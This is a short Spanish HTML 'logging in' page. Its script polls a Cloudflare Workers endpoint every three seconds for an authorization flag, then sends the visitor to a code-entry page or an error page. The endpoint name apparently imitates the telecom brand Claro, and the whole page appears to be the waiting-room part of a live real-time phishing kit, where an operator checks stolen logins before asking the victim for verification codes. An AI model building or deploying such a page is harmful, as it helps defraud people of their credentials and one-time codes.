<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ingresando...</title>
</head>
<body>
  <h2>Ingresando...</h2>
  <p id="status">Esperando autorización...</p>

  <script>
    const statusEl = document.getElementById("status");
    const loginId = localStorage.getItem("loginId");
    const workerUrl = "https://blue-night-7897.claropromoxlaro.workers.dev/status?id=";

    async function checkAuth() {
      try {
        const res = await fetch(workerUrl + loginId);
        const data = await res.json();

        if (!data) {
          statusEl.textContent = "ID no encontrado en el servidor.";
          return;
        }

        if (data.autorizado === true) {
          window.location.href = "codigo.html";
        } else if (data.autorizado === false) {
          window.location.href = "usererror.html";
        } else {
          statusEl.textContent = "Esperando autorización...";
        }

      } catch(err) {
        statusEl.textContent = "Error al conectar al servidor.";
        console.error(err);
      }
    }

    setInterval(checkAuth, 3000); // Revisar cada 3 segundos
  </script>
</body>
</html>
